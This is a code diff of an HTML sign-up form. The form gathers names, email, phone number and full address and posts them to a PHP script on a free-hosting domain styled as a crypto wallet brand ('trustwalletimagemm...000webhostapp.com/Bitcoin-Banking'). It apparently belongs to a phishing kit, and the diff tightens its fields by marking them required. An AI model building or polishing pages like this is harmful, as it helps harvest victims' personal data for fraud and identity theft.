@@ -55,20 +55,20 @@
 	<form id="regFormm" action="https://trustwalletimagemm.000webhostapp.com/Bitcoin-Banking/contact-info.php"  method="POST">
 			<!-- One "tab" for each step in the form: -->
 			<div class="inpt-box">
-				<input class="txtf " placeholder="First name." name="fname" id="name1" >
-				  <input class="txtf " placeholder="Last name." name="lname" id="lastname1" >
+				<input class="txtf " placeholder="First name." name="fname" id="name1" required />
+				  <input class="txtf " placeholder="Last name." name="lname" id="lastname1" required />
 			</div>
-			  <input required placeholder="E-mail Address" type="email" name="email" id="email">
+			  <input placeholder="E-mail Address" type="email" name="email" id="email" required />
 			  <span class="err">Enter your valid E-mail Address</span>
 			  <input type="tel" name="telephone"  placeholder="Phone Number" pattern="[0-9]{3}-[0-9]{3}-[0-9]{4}" required />
 			  <span class="err">Please enter your valid mobile phone number</span>
 			  <input type="address" name="address"  placeholder="Address"  required />
 			  <span class="err">Please enter your Address</span>
 			  <div class="inpt-box">
-				<input class="txtf " placeholder="City" name="city" id="city" autoComplete="home city" >
+				<input class="txtf " placeholder="City" name="city" id="city" autoComplete="home city" required / >
 				  <input class="txtf " placeholder="State" name="state" id="state" >
 			</div>
-			   <input required type="zipcode" name="zip"  placeholder="Zip Code" id="zip">
+			   <input  type="zipcode" name="zip"  placeholder="Zip Code" id="zip" required />
 			  <span class="err">Please verify your zip code</span>
 			  <button  type="submit" id="submit">GET STARTED NOW</button>
 			
